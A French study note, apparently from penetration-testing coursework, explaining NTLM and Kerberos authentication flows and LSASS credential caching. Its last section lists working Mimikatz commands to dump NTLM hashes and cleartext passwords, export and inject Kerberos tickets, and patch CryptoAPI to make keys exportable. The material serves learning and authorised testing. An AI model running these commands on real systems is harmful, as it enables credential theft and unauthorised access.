# Authentification

## Théorie

### NTLM

Utilisé quand :
- Authentification par **IP** (pas par hostname)
- Hostname non enregistré dans le DNS AD
- Application tierce qui ne supporte pas Kerberos

**Flux d'authentification (7 étapes)**

1. Le client calcule le **hash NTLM** depuis le mot de passe
2. Le client envoie le **username** au serveur
3. Le serveur renvoie un **nonce** (valeur aléatoire = challenge)
4. Le client chiffre le nonce avec le hash NTLM → **response**
5. Le serveur transfère username + nonce + response au **DC**
6. Le DC chiffre le nonce avec le hash NTLM stocké et compare à la response
7. Si égaux → authentification réussie

![](assets/Pasted%20image%2020260512145336.png)

> NTLM est non-réversible mais rapide à craquer (jusqu'à 600 milliards de hash/s avec GPU haut de gamme). Un mot de passe de 8 caractères peut être cracké en ~2,5h.

### Kerberos

Protocole par défaut depuis Windows Server 2003. Basé sur un système de **tickets** — le client s'authentifie auprès du **KDC** (Key Distribution Center, rôle tenu par le DC), pas directement auprès du serveur applicatif.

![](assets/Pasted%20image%2020260512145508.png)

| Acronyme | Signification                   |
| -------- | ------------------------------- |
| KDC      | Key Distribution Center         |
| TGT      | Ticket Granting Ticket          |
| AS-REQ   | Authentication Server Request   |
| AS-REP   | Authentication Server Reply     |
| TGS-REQ  | Ticket Granting Service Request |
| TGS-REP  | Ticket Granting Service Reply   |
| AP-REQ   | Application Request             |

**Phase 1 — Authentification client (AS-REQ / AS-REP)**

1. Le client envoie un **AS-REQ** au DC : timestamp chiffré avec le hash du mot de passe
2. Le DC déchiffre avec le hash stocké dans `ntds.dit` — si OK, renvoie un **AS-REP** contenant :
   - Une **session key** (chiffrée avec le hash du user)
   - Un **TGT** (Ticket Granting Ticket, chiffré avec le hash du compte `krbtgt` — le client ne peut pas le lire)

> Le TGT est valide 10h par défaut et se renouvelle sans redemander le mot de passe.

**Phase 2 — Accès à un service (TGS-REQ / TGS-REP)**

3. Le client envoie un **TGS-REQ** au KDC : username + timestamp chiffrés avec la session key + TGT + nom du service
4. Le KDC vérifie le TGT, extrait la session key, valide le timestamp et l'IP
5. Le KDC renvoie un **TGS-REP** contenant :
   - Un **service ticket** (chiffré avec le hash du compte de service)
   - Une nouvelle session key pour communiquer avec le service

**Phase 3 — Authentification auprès du service (AP-REQ)**

6. Le client envoie un **AP-REQ** au serveur applicatif : username + timestamp chiffrés avec la session key + service ticket
7. Le serveur déchiffre le ticket avec son propre hash, vérifie le username, lit les groupes → accorde l'accès

### Credentials mis en cache (LSASS)

Les hashes Kerberos (TGT, session keys) et NTLM sont stockés en mémoire dans le processus **LSASS** pour le SSO. Nécessite des droits **SYSTEM ou admin local** pour y accéder.

**Mimikatz — dump des hashes**

```powershell
# Depuis un PowerShell élevé (admin)
cd C:\Tools
.\mimikatz.exe

privilege::debug                  # activer SeDebugPrivilege
sekurlsa::logonpasswords          # dump NTLM/SHA1 de tous les users connectés
sekurlsa::tickets                 # dump TGT et TGS en mémoire
```

> `sekurlsa::logonpasswords` retourne les hashes NTLM et SHA1. Si WDigest est activé (Windows 7 ou config manuelle), les mots de passe en clair apparaissent aussi.

**Mimikatz — export/import de tickets Kerberos**

```
sekurlsa::tickets /export          # exporter les tickets sur disque (.kirbi)
kerberos::ptt <ticket.kirbi>       # injecter un ticket dans LSASS
```

**Mimikatz — certificats non-exportables (AD CS)**

```
crypto::capi                       # patcher CryptoAPI pour rendre les clés exportables
crypto::cng                        # patcher le service KeyIso
```

> Activer la **LSA Protection** (`HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL = 1`) bloque la lecture de LSASS par Mimikatz — bypass couvert dans PEN-300.

